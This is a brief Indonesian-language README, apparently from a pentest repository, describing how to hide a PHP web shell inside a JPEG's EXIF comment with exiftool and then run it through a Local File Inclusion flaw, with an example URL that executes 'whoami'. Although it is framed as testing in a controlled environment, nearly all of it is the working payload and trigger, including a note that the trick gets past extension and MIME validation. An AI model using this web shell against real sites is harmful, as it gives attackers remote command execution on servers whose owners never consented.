# Stego PHP Payload
Steganografi untuk menyisipkan payload PHP dalam file gambar, digunakan untuk pengujian keamanan web di lingkungan terkontrol. 

# Payload

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' kucing.jpg -o shell.jpg
```

# Eksekusi
Eksekusi backdoor pada file gambar melalui celah Local File Inclusion (LFI). Meskipun terdapat validasi ekstensi dan MIME type, serangan tetap dimungkinkan karena adanya kerentanan LFI :

```
https://example.com/index.php?page=uploads/shell.jpg&cmd=whoami
```


